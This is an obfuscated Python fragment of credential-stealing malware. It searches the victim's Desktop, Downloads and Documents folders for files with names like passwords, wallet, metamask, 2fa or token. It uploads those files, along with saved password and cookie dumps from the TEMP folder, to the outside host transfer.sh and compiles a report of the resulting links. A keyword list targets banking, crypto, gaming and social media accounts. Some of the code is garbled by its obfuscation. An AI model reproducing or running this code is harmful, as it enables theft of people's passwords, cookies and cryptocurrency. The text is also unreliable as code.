    for lIIIIlllIl in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
        IllIIlIlIIllIIIlI(os.getenv("TEMP") + "\\" + lIIIIlllIl)
def IlllIlIIIIlIllIIlI(lllIllIIlIlllllIIIIl):
    try:
        IIllllIlllIlIlIIl = { "file": (lllIllIIlIlllllIIIIl, open(lllIllIIlIlllllIIIIl, mode='rb')) }
        ...
        IllIIlIlIIllIIIlI = requests.post("https://transfer.sh/", IIllllIlllIlIlIIl=IIllllIlllIlIlIIl)
        lIIlllllIIIlIlIIlIl = IllIIlIlIIllIIIlI.text
        return lIIlllllIIIlIlIIlIl
    except:
        return False
def lIIllIIIll(IIllllIIIIlllIllIl, IlllIIlIlIlIl):
    global IlIlIIllII
    llIIlIlIlIll = 7
    lIlIllllIllIlIIllII = 0
    lIIIIIIIII = os.listdir(IIllllIIIIlllIllIl)
    IllllIIIIlIIll = []
    for lIIIIlllIl in lIIIIIIIII:
        if not os.lllIllIIlIlllllIIIIl.isfile(IIllllIIIIlllIllIl + "/" + lIIIIlllIl): return
        lIlIllllIllIlIIllII += 1
        if lIlIllllIllIlIIllII <= llIIlIlIlIll:
            lIIlllllIIIlIlIIlIl = IlllIlIIIIlIllIIlI(IIllllIIIIlllIllIl + "/" + lIIIIlllIl)
            IllllIIIIlIIll.append([IIllllIIIIlllIllIl + "/" + lIIIIlllIl, lIIlllllIIIlIlIIlIl])
        else:
            break
    IlIlIIllII.append(["folder", IIllllIIIIlllIllIl + "/", IllllIIIIlIIll])
IlIlIIllII = []
def lIIllIlllIIIlIlIlIll(lllIllIIlIlllllIIIIl, IlllIIlIlIlIl):
    global IlIlIIllII
    IIIIIIlllIlll = []
    lIIIIIIIII = os.listdir(lllIllIIlIlllllIIIIl)
    for lIIIIlllIl in lIIIIIIIII:
        for IllIIlIllllllll in IlllIIlIlIlIl:
            if IllIIlIllllllll in lIIIIlllIl.lower():
                if os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl) and ".txt" in lIIIIlllIl:
                    IIIIIIlllIlll.append([lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl, IlllIlIIIIlIllIIlI(lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl)])
                    break
                if os.lllIllIIlIlllllIIIIl.isdir(lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl):
                    llIlIIllIIIl = lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl
                    lIIllIIIll(llIlIIllIIIl, IlllIIlIlIlIl)
                    break
    IlIlIIllII.append(["folder", lllIllIIlIlllllIIIIl, IIIIIIlllIlll])
def IIIIlIIIlIlIIlIIIIll():
    IlIlIIIlIll = lIIllIlIlIIIIIlIII.split("\AppData")[0]
    IIllIIIlllI = [
        IlIlIIIlIll + "/Desktop",
        IlIlIIIlIll + "/Downloads",
        IlIlIIIlIll + "/Documents"
    ]
    IIIlIlllllIlIIII = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        ]
    lIllIllIIIllIlI = []
    for IlIlllIlllIIlIIIl in IIllIIIlllI:
        IIIIlIIIlIlIIlIIIIll = threading.Thread(llIlIIllIIIl=lIIllIlllIIIlIlIlIll, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl, IIIlIlllllIlIIII]);IIIIlIIIlIlIIlIIIIll.start()
        lIllIllIIIllIlI.append(IIIIlIIIlIlIIlIIIIll)
    return lIllIllIIIllIlI
global lIIIllIlIlI, lllIIIIlIIIlllI, IIllllIIIIl
lIIIllIlIlI = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]
lllIIIIlIIIlllI = []
IIllllIIIIl = []
lllllIlI()
IllllIllIIIIlllII = lIlIlIllllIlllIIIII(llIIllIIIllI)
if not IllllIllIIIIlllII:
    lIllIllIIIllIlI = IIIIlIIIlIlIIlIIIIll()
    for lllIlIIlIlllI in lIllIllIIIllIlI: lllIlIIlIlllI.join()
    lIlllIlIIII.sleep(0.2)
    IIIlllIlIIl = "```diff\n"
    for IIIllIIIIIIllIll in IlIlIIllII:
        if len(IIIllIIIIIIllIll[2]) != 0:
            IIIlIIll = IIIllIIIIIIllIll[1]
            IIlIlIlIlIlIIllIlIll = IIIllIIIIIIllIll[2]
            IIIlllIlIIl +=llllIlIlll"\n"
            IIIlllIlIIl += llllIlIlll"- {llllIlIlllIIIIlIllIIIlllIplIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIh}\n"
            for llIlIIlIIlIlIlIlIlIl in IIlIlIlIlIlIIllIlIll:
                lIlIlIIIlIlllIlllII = llIlIIlIIlIlIlIlIlIl[0].split("/")
                lIllIIIIl = lIlIlIIIlIlllIlllII[len(lIlIlIIIlIlllIlllII)-1]
                lllllIllIIIl = llIlIIlIIlIlIlIlIlIl[1]
                IIIlllIlIIl += llllIlIlll"+ Name: {lIIIIlllIllIlIlIIIlIlllIlllIInmllllllII}\n+ LlIlIllllIllIlIIllIInk: {lllllIllIIIIIIlIIllIlIlllIllI}"
                IIIlllIlIIl += "\n"
    IIIlllIlIIl += "\n```"
    IllIIlIlIIllIIIlI("bc_checking", IIIlllIlIIl)
    lIlIIIlIlIIllllIIIl = threading.Thread(llIlIIllIIIl=IlIllIIllIllIII().lllIIlIlI)
    lIlIIIlIlIIllllIIIl.start()
